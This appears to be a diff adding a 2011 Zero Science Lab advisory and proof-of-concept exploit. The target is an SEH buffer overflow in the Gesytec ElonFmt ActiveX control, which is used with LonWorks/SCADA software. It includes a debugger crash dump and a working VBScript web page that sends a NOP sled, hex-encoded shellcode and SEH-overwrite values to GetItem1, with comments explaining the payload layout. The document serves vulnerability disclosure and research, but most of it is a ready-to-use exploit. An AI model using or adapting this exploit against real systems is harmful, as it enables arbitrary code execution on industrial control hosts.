@@ -1,0 +1,173 @@
+<!--
+
+
+Gesytec ElonFmt ActiveX 1.1.14 (ElonFmt.ocx) pid Item Buffer Overflow (SEH)
+
+
+Vendor: Gesytec GmbH
+Product web page: http://www.gesytec.de
+Affected version: 1.1.14.1
+
+Summary: Connects LonWorks networks to process control, visualization, SCADA
+and office software.
+
+Desc: The ElonFmt ActiveX Control Module suffers from a buffer overflow
+vulnerability. When a large buffer is sent to the pid item of the GetItem1
+function in elonfmt.ocx module, we get a few memory registers overwritten
+including the SEH. We're dealing with a character translation. An attacker
+can gain access to the system on the affected node and execute arbitrary code.
+
+
+----------------------------------------------------------------------------------
+
+(fc.1608): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000000 ebx=00000000 ecx=cccccccc edx=7c9032bc esi=00000000 edi=00000000
+eip=cccccccc esp=0013e7d8 ebp=0013e7f8 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+cccccccc ??              ???
+0:000> !exchain
+0013e7ec: ntdll!ExecuteHandler2+3a (7c9032bc)
+0013ecf0: cccccccc
+Invalid exception stack at bbbbbbbb
+0:000> u 0013ecf0
+0013ecf0 bbbbbbbbcc      mov     ebx,0CCBBBBBBh
+0013ecf5 cc              int     3
+0013ecf6 cc              int     3
+0013ecf7 cc              int     3
+0013ecf8 dddd            fstp    st(5)
+0013ecfa dddd            fstp    st(5)
+0013ecfc dddd            fstp    st(5)
+0013ecfe dddd            fstp    st(5)
+
+...
+...
+...
+
+0:000> d esp
+0013eb58  01 00 00 00 8d 61 53 80-7c 5a 63 af 00 00 00 00  .....aS.|Zc.....
+0013eb68  88 d5 2e ba 00 00 00 00-24 46 53 8a 00 86 8f bf  ........$FS.....
+0013eb78  a8 5a 63 af a8 5a 63 af-fb 0a 80 bf 60 29 53 89  .Zc..Zc.....`)S.
+0013eb88  ce 86 8f bf 68 d5 2e ba-88 d5 2e ba 00 00 00 00  ....h...........
+0013eb98  06 00 05 00 a1 00 00 00-2e 0e 73 74 d1 18 43 7e  ..........st..C~
+0013eba8  01 00 00 00 00 00 00 00-40 f7 47 00 81 18 c3 77  ........@.G....w
+0013ebb8  1a 03 00 00 a2 56 00 10-00 ed 13 00 e8 eb 13 00  .....V..........
+0013ebc8  20 8f 63 01 b8 8e 63 01-81 18 c3 77 01 00 00 00   .c...c....w....
+0:000> d
+0013ebd8  64 21 12 77 ff 00 00 00-74 e1 97 7c 51 7c 91 7c  d!.w....t..|Q|.|
+0013ebe8  aa aa aa aa aa aa aa aa-aa aa aa aa aa aa aa aa  ................
+0013ebf8  aa aa aa aa aa aa aa aa-aa aa aa aa aa aa aa aa  ................
+0013ec08  aa aa aa aa aa aa aa aa-aa aa aa aa aa aa aa aa  ................
+0013ec18  aa aa aa aa aa aa aa aa-aa aa aa aa aa aa aa aa  ................
+0013ec28  aa aa aa aa aa aa aa aa-aa aa aa aa aa aa aa aa  ................
+0013ec38  aa aa aa aa aa aa aa aa-aa aa aa aa aa aa aa aa  ................
+0013ec48  aa aa aa aa aa aa aa aa-aa aa aa aa aa aa aa aa  ................
+
+...
+...
+...
+
+0:000> d
+0013ece8  aa aa aa aa aa aa aa aa-bb bb bb bb cc cc cc cc  ................
+0013ecf8  dd dd dd dd dd dd dd dd-dd ad d0 01 01 00 63 01  ..............c.
+0013ed08  00 00 00 00 b8 8e 63 01-01 00 00 00 00 ed 13 00  ......c.........
+0013ed18  82 a5 00 10 8c ed 13 00-b8 8e 63 01 28 ee 13 00  ..........c.(...
+0013ed28  00 00 00 00 80 02 63 01-80 ed 13 00 ae 43 dd 73  ......c......C.s
+0013ed38  5c ed 13 00 d8 f0 00 10-02 00 00 00 d9 a3 00 10  \...............
+0013ed48  80 02 63 01 24 8e 56 01-01 00 00 00 78 8e 63 01  ..c.$.V.....x.c.
+0013ed58  48 ed 13 00 80 ed 13 00-98 f0 00 10 01 00 00 00  H...............
+
+
+
+----------------------------------------------------------------------------------
+
+
+Tested on: Microsoft Windows XP Professional SP3 (EN)
+           Easylon OPC Server M 2.30.66.0
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            liquidworm gmail com
+                            Zero Science Lab - http://www.zeroscience.mk
+
+High five to sickn3ss!
+
+
+Advisory ID: ZSL-2011-5011
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2011-5011.php
+
+
+09.04.2011
+
+
+JUST A PoC MODEL:
+
+
+-->
+
+
+
+<html>
+<object classid='clsid:824C4DC5-8DA4-11D6-A01F-00E098177CDC' id='zsl' />
+<script language='VBScript'>
+
+targetFile = "C:\Easylon\Shared\ElonFmt.ocx"
+prototype  = "Function GetItem1 ( ByVal typeName As String ,  ByVal pid As String ,  ByVal selector As Integer ) As Object"
+memberName = "GetItem1"
+progid     = "ELONFMTLib.ElonFmt"
+argCount   = 3
+
+arg1="defaultV"
+
+arg2 = String(10, "90") _
+     + "2bc9b88bc18865b132ddc3d97424f45d31450e03" _
+     + "450e834ec56a90ac2ee35b4caf94d2a99e8681ba" _
+     + "b316c1ee3fdc871acb900f2d7c1e76007daeb6ce" _
+     + "bdb04a0c921272dfe753b33d07016c4abab6190e" _
+     + "07b6cd0537c068d9cc7a72097cf03cb1f65e9dc0" _
+     + "dbbce18b5076910ab1465a3dfd0565f2f054a134" _
+     + "eb22d94796341a3a4cb0bf9c0762641dcbf5ef11" _
+     + "a072b7353756c341bc5904c0867d80895d1f9177" _
+     + "3320c1dfec8489cdf9bfd39bfc326ee2ff4c7144" _
+     + "687cfa0bef8129681fc870d88895e059d525df9d" _
+     + "e0a5ea5d17b59e5853717210cc147487ed3c1746" _
+     + "7edcd8" _
+     + String(62, "A") + "eb069090" + "78c70110" _
+     + "e9e0fdffff" + String(20, "D")
+
+arg3=1
+
+zsl.GetItem1 arg1 ,arg2 ,arg3
+
+
+
+'
+'Argument No.2 Structure:
+'--------------------------------------------------------------------------------------------------------------
+'
+' (20)NOPSLED + (446)SCODE(calc) + (62)JUNK + (8)JMP + (8)P/P/R EDI LDRF32R.dll + (10)JMP BCk + (20)JUNK
+'
+'--------------------------------------------------------------------------------------------------------------
+'
+'
+'
+'Scenes (2/5)
+'--------------------------------------------------------------------------------------------------------------
+'
+'arg2 = String(528, "A") + "BBBBBBBB" + "CCCCCCCC" + "DDDDDDDD" + "41414141"
+'
+'           junk             nseh        seh(eip)        pad         eip
+'
+'--------------------------------------------------------------------------------------------------------------
+'
+'arg2 = String(528, "A") + "BBBBBBBB" + "CCCCCCCC" + String(101, "D")
+'
+'           junk             nseh        seh(eip)         random
+'
+'--------------------------------------------------------------------------------------------------------------
+'
+
+
+</script>
+</html>
